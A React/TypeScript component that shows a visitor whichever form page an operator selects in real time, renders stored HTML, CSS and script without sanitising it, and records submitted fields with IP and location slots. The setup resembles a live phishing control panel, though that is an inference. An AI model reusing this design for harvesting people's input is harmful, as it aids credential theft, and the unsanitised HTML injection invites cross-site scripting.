
import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { toast } from '@/components/ui/sonner';

interface SessionData {
  id: string;
  main_page_id: string;
  current_sub_page_id: string;
  active: boolean;
}

interface SubPageData {
  id: string;
  name: string;
  description: string;
  html: string;
  css: string;
  javascript: string;
  fields: string[];
}

const SessionPage = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const [session, setSession] = useState<SessionData | null>(null);
  const [subPage, setSubPage] = useState<SubPageData | null>(null);
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!sessionId) return;

    const fetchSessionData = async () => {
      try {
        // Fetch session data
        const { data: sessionData, error: sessionError } = await supabase
          .from('sessions')
          .select('*')
          .eq('id', sessionId)
          .eq('active', true)
          .single();

        if (sessionError) {
          console.error('Session error:', sessionError);
          toast.error('Session not found or inactive');
          return;
        }

        setSession(sessionData);

        // Fetch current sub page data
        const { data: subPageData, error: subPageError } = await supabase
          .from('sub_pages')
          .select('*')
          .eq('id', sessionData.current_sub_page_id)
          .single();

        if (subPageError) {
          console.error('Sub page error:', subPageError);
          toast.error('Page content not found');
          return;
        }

        setSubPage(subPageData);
      } catch (error) {
        console.error('Error fetching session:', error);
        toast.error('Failed to load session');
      } finally {
        setLoading(false);
      }
    };

    fetchSessionData();
  }, [sessionId]);

  // Set up real-time subscription for session updates
  useEffect(() => {
    if (!sessionId) return;

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'sessions',
          filter: `id=eq.${sessionId}`
        },
        async (payload) => {
          console.log('Session updated:', payload);
          const updatedSession = payload.new as SessionData;
          setSession(updatedSession);

          // If sub page changed, fetch new sub page data
          if (updatedSession.current_sub_page_id !== subPage?.id) {
            const { data: newSubPageData } = await supabase
              .from('sub_pages')
              .select('*')
              .eq('id', updatedSession.current_sub_page_id)
              .single();

            if (newSubPageData) {
              setSubPage(newSubPageData);
              setFormData({}); // Reset form data when page changes
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, subPage?.id]);

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!sessionId || !formData || Object.keys(formData).length === 0) {
      toast.error('Please fill in at least one field');
      return;
    }

    try {
      // Get user's location and IP (simplified)
      const location = 'Unknown Location';
      const ip = 'Unknown IP';

      const { error } = await supabase
        .from('session_data')
        .insert({
          session_id: sessionId,
          timestamp: new Date().toISOString(),
          ip_address: ip,
          location: location,
          form_data: formData
        });

      if (error) throw error;

      // Update session to mark new data
      await supabase
        .from('sessions')
        .update({ has_new_data: true })
        .eq('id', sessionId);

      toast.success('Data submitted successfully!');
      setFormData({}); // Reset form
    } catch (error) {
      console.error('Error submitting data:', error);
      toast.error('Failed to submit data');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p>Loading session...</p>
        </div>
      </div>
    );
  }

  if (!session || !subPage) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card className="max-w-md">
          <CardHeader>
            <CardTitle>Session Not Found</CardTitle>
          </CardHeader>
          <CardContent>
            <p>The session you're looking for is not available or has been closed.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-2xl mx-auto">
        <Card>
          <CardHeader>
            <CardTitle>{subPage.name}</CardTitle>
            {subPage.description && (
              <p className="text-muted-foreground">{subPage.description}</p>
            )}
          </CardHeader>
          <CardContent>
            {/* Render custom HTML if available */}
            {subPage.html && (
              <div 
                className="mb-6 prose prose-sm max-w-none"
                dangerouslySetInnerHTML={{ __html: subPage.html }}
              />
            )}

            {/* Dynamic form based on fields */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {subPage.fields && subPage.fields.map((field, index) => (
                <div key={index} className="space-y-2">
                  <Label htmlFor={field}>{field}</Label>
                  {field.toLowerCase().includes('message') || field.toLowerCase().includes('comment') ? (
                    <Textarea
                      id={field}
                      placeholder={`Enter ${field.toLowerCase()}`}
                      value={formData[field] || ''}
                      onChange={(e) => handleInputChange(field, e.target.value)}
                    />
                  ) : (
                    <Input
                      id={field}
                      type={field.toLowerCase().includes('email') ? 'email' : 
                           field.toLowerCase().includes('phone') ? 'tel' : 'text'}
                      placeholder={`Enter ${field.toLowerCase()}`}
                      value={formData[field] || ''}
                      onChange={(e) => handleInputChange(field, e.target.value)}
                    />
                  )}
                </div>
              ))}

              {(!subPage.fields || subPage.fields.length === 0) && (
                <div className="space-y-2">
                  <Label htmlFor="message">Message</Label>
                  <Textarea
                    id="message"
                    placeholder="Enter your message"
                    value={formData.message || ''}
                    onChange={(e) => handleInputChange('message', e.target.value)}
                  />
                </div>
              )}

              <Button type="submit" className="w-full">
                Submit
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* Render custom CSS */}
        {subPage.css && (
          <style dangerouslySetInnerHTML={{ __html: subPage.css }} />
        )}

        {/* Render custom JavaScript */}
        {subPage.javascript && (
          <script dangerouslySetInnerHTML={{ __html: subPage.javascript }} />
        )}
      </div>
    </div>
  );
};

export default SessionPage;
